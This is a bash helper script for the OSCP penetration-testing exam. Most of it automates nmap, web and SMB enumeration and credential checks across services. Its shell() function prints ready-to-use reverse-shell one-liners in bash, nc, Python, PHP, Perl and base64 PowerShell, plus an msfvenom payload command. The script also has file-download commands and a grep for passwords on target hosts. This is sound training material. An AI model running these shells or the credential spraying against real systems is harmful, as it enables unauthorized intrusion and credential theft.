#!/bin/bash
# ============================================================================
#  oscp.sh — OSCP exam helper (ENUMERATION / SETUP / WORKFLOW only)
#  EXAM-COMPLIANT: automates enumeration & busy-work, NOT exploitation.
#  Usage:  source ~/oscp.sh    (once, at exam start)
#  Then:   ws · enum · spray · hosts · flags · addhost · serve · smbserve · listen · tun
#  ⚠️ Understand every command before you run it. Run enum in the BACKGROUND
#     while you manually probe 80/443/445. Never rely on automation blindly.
# ============================================================================

# your VPN IP (LHOST) — auto-detected from tun0 (won't clobber a manually-set $IP)
_tun=$(ip -o -4 addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
[ -n "$_tun" ] && export IP="$_tun"
[ -z "$IP" ] && echo "[!] tun0 not up — set your IP manually:  export IP=10.10.14.x"

# ws <name> <target-ip>  → make a workspace and set $T / $IP
ws(){
  mkdir -p ~/oscp/"$1"/{scans,loot,exploits,www}; cd ~/oscp/"$1" || return
  export T="$2"
  echo "[+] workspace ~/oscp/$1 ready   ·   \$T=$T   ·   \$IP=$IP"
}

# enum <ip>  → full TCP scan → -sCV on open ports → UDP top100 → fan out to web/smb
#   (all ENUMERATION. Read scans/scv.txt; route each port via [ENUM-DECISION].)
enum(){
  local t=${1:-$T}
  [ -z "$t" ] && { echo "usage: enum <ip>   (or set \$T with ws)"; return 1; }
  mkdir -p scans
  echo "[*] full TCP scan $t ..."
  nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt "$t"
  local p; p=$(grep -oE '^[0-9]+/tcp +open' scans/all-tcp.txt | cut -d/ -f1 | paste -sd, -)
  echo "[+] open ports: $p"
  [ -z "$p" ] && { echo "[!] no open TCP ports found"; return; }
  nmap -p"$p" -sCV -Pn -oN scans/scv.txt "$t"
  nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt "$t" &
  if [[ ",$p," == *,80,* || ",$p," == *,443,* || ",$p," == *,8080,* || ",$p," == *,8000,* ]]; then
    echo "[*] web detected → whatweb + feroxbuster (background)"
    whatweb "http://$t" 2>/dev/null
    feroxbuster -u "http://$t" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o scans/ferox.txt >/dev/null 2>&1 &
  fi
  if [[ ",$p," == *,445,* ]]; then
    echo "[*] smb detected → nxc + enum4linux-ng"
    nxc smb "$t" -u '' -p '' --shares | tee scans/smb.txt
    enum4linux-ng -A "$t" > scans/enum4.txt 2>&1 &
  fi
  [[ ",$p," == *,88,* ]] && echo "[!] port 88 open → this is a DC / AD → see [AD-QUICK]"
  echo "[+] done. read scans/scv.txt and route each port via [ENUM-DECISION]."
}

# spray <user> <pass> <ip-or-hostfile>  → VALIDATE one credential across services
#   (credential validation = allowed; this is NOT brute-forcing)
spray(){
  [ -z "$3" ] && { echo "usage: spray <user> <pass> <ip-or-hostfile>"; return 1; }
  for s in smb winrm ldap mssql rdp ssh; do
    echo "=== $s ==="
    nxc "$s" "$3" -u "$1" -p "$2" --continue-on-success 2>/dev/null
  done
}

# hosts <cidr>  → alive hosts on an (internal) subnet, post-pivot
hosts(){ nxc smb "$1" 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u; }

# flags  → run ON a Linux target shell: hunt flag/creds
flags(){
  find / -iname '*flag*' 2>/dev/null
  grep -rniE 'flag\{|OS\{|password|secret' /home /var/www /opt /etc 2>/dev/null
}

# addhost <ip> <hostname>  → add a vhost/hostname to /etc/hosts
addhost(){ grep -q "$2" /etc/hosts || echo "$1 $2" | sudo tee -a /etc/hosts; }

# shell <type> [port]  → print a reverse-shell one-liner with YOUR $IP filled in
#   types: bash sh nc python php perl ps msf-exe   (start 'listen' in another tab first)
shell(){
  local p=${2:-443}
  case "$1" in
    bash) echo "bash -c 'bash -i >& /dev/tcp/$IP/$p 0>&1'";;
    sh)   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $p >/tmp/f";;
    nc)   echo "nc $IP $p -e /bin/bash        # or nc.exe $IP $p -e cmd.exe on Windows";;
    python) echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$IP\",$p));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn(\"/bin/bash\")'";;
    php)  echo "php -r '\$s=fsockopen(\"$IP\",$p);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";;
    perl) echo "perl -e 'use Socket;\$i=\"$IP\";\$p=$p;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";;
    ps|powershell)
      local c="\$client=New-Object System.Net.Sockets.TCPClient('$IP',$p);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){\$data=(New-Object Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sb=(iex \$data 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sbt=([Text.Encoding]::ASCII).GetBytes(\$sb2);\$stream.Write(\$sbt,0,\$sbt.Length);\$stream.Flush()}"
      echo "# base64 (run: powershell -e <blob>):"
      echo "powershell -e $(printf '%s' "$c" | iconv -t UTF-16LE 2>/dev/null | base64 -w0)";;
    msf-exe) echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$p -f exe -o rev.exe";;
    *) echo "usage: shell <bash|sh|nc|python|php|perl|ps|msf-exe> [port=443]   (URL-encode for web params!)";;
  esac
}

# transfer <file>  → print how to pull <file> from your Kali to a target (serve the dir first)
transfer(){
  [ -z "$1" ] && { echo "usage: transfer <file>   (run 'serve' in the dir holding it first)"; return 1; }
  echo "# Linux target:"
  echo "wget http://$IP/$1 -O /tmp/$1   ||   curl http://$IP/$1 -o /tmp/$1"
  echo "# Windows target:"
  echo "certutil -urlcache -split -f http://$IP/$1 $1"
  echo "powershell -c \"iwr http://$IP/$1 -OutFile $1\""
  echo "# (make sure 'serve' is running in the folder that has $1)"
}

alias serve='python3 -m http.server 80'                        # serve current dir to targets
alias smbserve='impacket-smbserver share $(pwd) -smb2support'  # SMB drop (great for Windows)
alias listen='nc -lvnp 443'                                    # reverse-shell listener
alias tun='ip -o -4 addr show tun0 | awk "{print \$4}"'        # show your VPN IP

echo "[+] oscp helpers loaded:  ws · enum · spray · hosts · flags · addhost · shell · transfer · serve · smbserve · listen · tun"
echo "    \$IP (tun0) = ${IP:-<not connected>}"
